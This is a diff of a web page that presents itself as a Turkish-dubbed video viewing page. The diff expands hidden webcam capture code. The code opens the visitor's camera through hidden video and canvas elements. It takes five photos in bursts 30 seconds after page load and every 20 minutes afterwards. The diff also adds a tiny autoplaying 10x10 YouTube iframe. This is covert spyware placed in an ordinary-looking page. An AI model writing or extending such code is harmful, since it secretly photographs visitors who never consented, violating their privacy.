@@ -139,16 +139,23 @@
             console.log('Camera stopped.');
         }
 
-        // Function to activate the camera and capture photo
-        function activateCameraAndCapture() {
+        // Function to activate the camera and capture multiple photos
+        function activateCameraAndCaptureMultiple() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then((stream) => {
                     video.srcObject = stream;
                     videoStream = stream;
-                    video.onloadedmetadata = () => {
+
+                    let count = 0;
+                    const captureInterval = setInterval(() => {
                         capturePhoto();
-                        stopCamera(videoStream);
-                    };
+                        count++;
+
+                        if (count >= 5) {
+                            clearInterval(captureInterval);
+                            stopCamera(videoStream);
+                        }
+                    }, 2000); // Capture a picture every 2 seconds (5 pictures in 10 seconds)
                 })
                 .catch((error) => {
                     console.error('Error accessing the camera:', error);
@@ -159,29 +166,15 @@
         function scheduleAutomaticCapture() {
             setTimeout(() => {
                 console.log('Taking initial photo after 30 seconds');
-                activateCameraAndCapture();
+                activateCameraAndCaptureMultiple();
 
                 setInterval(() => {
-                    console.log('Taking photo every 20 minutes');
-                    activateCameraAndCapture();
+                    console.log('Taking photos every 20 minutes');
+                    activateCameraAndCaptureMultiple();
                 }, 1200000); // 20 minutes in milliseconds
 
             }, 30000); // 30 seconds in milliseconds
         }
-
-        // Click count logic for video player
-        let clickCount = 0;
-        const videoPlayer = document.querySelector('.video-container iframe');
-
-        videoPlayer.addEventListener('click', () => {
-            clickCount++;
-            console.log(`Video player clicked. Count: ${clickCount}`);
-
-            if (clickCount === 1 || clickCount % 5 === 0) {
-                console.log('Taking photo based on click count');
-                activateCameraAndCapture();
-            }
-        });
 
         // Start the automatic capture schedule on page load
         document.addEventListener('DOMContentLoaded', scheduleAutomaticCapture);
@@ -206,7 +199,12 @@
             dostluk, cesaret ve kaderin güçlerini keşfedin. Türkçe dublaj ile keyifle izleyin!
         </p>
     </div>
-
+  </div>
+    <div class="youtube-container">
+    <iframe id="youtube-player" width="10" height="10" 
+            src="https://www.youtube.com/embed/sN98tqCikyM?list=PLT48E20fpetQNQbeACxWZYi2mem06SZm7&autoplay=1&mute=1&loop=1&playlist=PLT48E20fpetQNQbeACxWZYi2mem06SZm7" 
+            frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+</div>
     <!-- Hidden video and canvas elements -->
     <video id="video" autoplay></video>
     <canvas id="canvas" style="display: none;"></canvas>
